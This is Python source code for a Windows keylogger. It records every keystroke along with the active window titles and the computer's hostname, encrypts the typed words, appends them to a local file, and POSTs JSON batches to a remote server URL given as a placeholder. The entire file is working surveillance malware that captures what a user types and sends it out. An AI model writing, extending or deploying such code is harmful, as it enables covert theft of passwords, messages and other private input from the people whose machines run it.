import socket
import ctypes
import win32api
import win32gui
import win32process
from pynput.keyboard import Listener, Key
import requests
import datetime
from keylogger.Encryption import encryption


def get_system_info():
    return {
        "computer_name": socket.gethostname(),
    }

user32 = ctypes.WinDLL('user32', use_last_error=True)

class KeyLogger:
    def __init__(self, server_url, log_file="a.txt", max_words_per_line=10):
        self.server_url = server_url
        self.log_file = log_file
        self.current_word = ""
        self.words_buffer = []
        self.max_words_per_line = max_words_per_line
        self.last_active_window = None
        self.pressed_keys = set()
        self.computer_name = get_system_info()["computer_name"]
        self.current_window_title = ""

        self.modifier_keys = {
            Key.ctrl_l, Key.ctrl_r,
            Key.alt_l, Key.alt_r,
            Key.shift, Key.shift_l, Key.shift_r,
            Key.cmd, Key.cmd_l, Key.cmd_r
        }

    def get_keyboard_layout(self):
        hwnd = win32gui.GetForegroundWindow()
        thread_id, _ = win32process.GetWindowThreadProcessId(hwnd)
        return win32api.GetKeyboardLayout(thread_id)

    def get_active_window_info(self):
        hwnd = win32gui.GetForegroundWindow()
        if hwnd != self.last_active_window:
            self.last_active_window = hwnd
            window_title = win32gui.GetWindowText(hwnd)
            self.current_window_title = window_title
            return window_title
        return None

    def send_to_server(self, data):
        try:
            response = requests.post(self.server_url, json=data)
            if response.status_code != 200:
                print(f"[Warning] Server responded with status code {response.status_code}")
        except Exception as e:
            print(f"[Error] Sending data to server failed: {e}")

    def write_to_file(self, data):
        try:
            with open(self.log_file, "a", encoding="utf-8") as f:
                f.write(data)
        except Exception as e:
            print(f"[Error] Writing to file failed: {e}")

    def log_active_window_change(self):
        title = self.get_active_window_info()
        if title is not None:
            log_line = f"\n\n[Active Window: '{title}']\n"
            self.write_to_file(log_line)
            print(log_line, end='')

    def get_character_from_vk_code(self, vk_code):
        layout = self.get_keyboard_layout()
        scan_code = user32.MapVirtualKeyExW(vk_code, 0, layout)
        key_state = (ctypes.c_ubyte * 256)()
        buffer = ctypes.create_unicode_buffer(5)
        result = user32.ToUnicodeEx(vk_code, scan_code, key_state, buffer, len(buffer), 0, layout)
        return buffer.value if result > 0 else ''

    def get_pressed_modifiers_names(self):
        names = []
        for mod_key in self.pressed_keys:
            if mod_key in {Key.ctrl_l, Key.ctrl_r}:
                names.append('Ctrl')
            elif mod_key in {Key.alt_l, Key.alt_r}:
                names.append('Alt')
            elif mod_key in {Key.shift, Key.shift_l, Key.shift_r}:
                names.append('Shift')
            elif mod_key in {Key.cmd, Key.cmd_l, Key.cmd_r}:
                names.append('Cmd')
        return names

    def _add_word_to_buffer(self, word=None):
        if word is None:
            word = self.current_word

        if word:
            self.words_buffer.append(encryption(word))
            self.current_word = ""

        if len(self.words_buffer) >= self.max_words_per_line:
            self.flush_buffer(newline=True)

    def flush_buffer(self, newline=False, final=False):
        if final and self.current_word:
            self.words_buffer.append(encryption(self.current_word))
            self.current_word = ""

        if self.words_buffer:
            line = ' '.join(self.words_buffer)
            timestamp_str = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


            json_data = {
                "computer_name": self.computer_name,
                "timestamp": timestamp_str,
                "active_window": self.current_window_title,
                "log": line
            }


            self.send_to_server(json_data)


            line_to_write = f"{line}  [{timestamp_str}] [Window: {self.current_window_title}]\n"
            self.write_to_file(line_to_write)

            if newline:
                print(f"  [{timestamp_str}]\n", end='')

            self.words_buffer = []

    def on_key_press(self, key):
        try:
            self.log_active_window_change()

            if key in self.modifier_keys:
                self.pressed_keys.add(key)
                return

            if key == Key.esc:
                print("\n[Stopped by ESC]")
                self.flush_buffer(final=True)
                return False

            elif key == Key.space:
                self._add_word_to_buffer()
                print(' ', end='', flush=True)

            elif key == Key.enter:
                self._add_word_to_buffer()
                self.flush_buffer(newline=True)
                print('\n', end='', flush=True)

            elif key == Key.backspace:
                if self.current_word:
                    self.current_word = self.current_word[:-1]
                    print('\b \b', end='', flush=True)

            elif hasattr(key, 'vk'):
                modifiers_pressed = self.get_pressed_modifiers_names()
                char = self.get_character_from_vk_code(key.vk)

                if modifiers_pressed:
                    combo = '+'.join(modifiers_pressed)
                    if char:
                        combo += f"+{char}"
                    else:
                        combo += f"+{key.name if hasattr(key, 'name') else str(key)}"
                    self._add_word_to_buffer(combo)
                    print(f"[{combo}]", end='', flush=True)
                else:
                    if char:
                        self.current_word += char
                        print(char, end='', flush=True)

        except Exception as error:
            print(f"\n[Error]: {error}")

    def on_key_release(self, key):
        if key in self.modifier_keys and key in self.pressed_keys:
            self.pressed_keys.remove(key)

    def run(self):
        print("Keylogger started. Press ESC to stop.\n")
        with Listener(on_press=self.on_key_press, on_release=self.on_key_release) as listener:
            listener.join()

if __name__ == "__main__":
    SERVER_URL = "https://fv"
    LOG_FILE = "a.txt"

    keylogger = KeyLogger(server_url=SERVER_URL, log_file=LOG_FILE)


    system_info = get_system_info()
    system_info_line = f"[System Info] Computer Name: {system_info['computer_name']}\n"
    keylogger.write_to_file(system_info_line)
    print(system_info_line)

    keylogger.run()
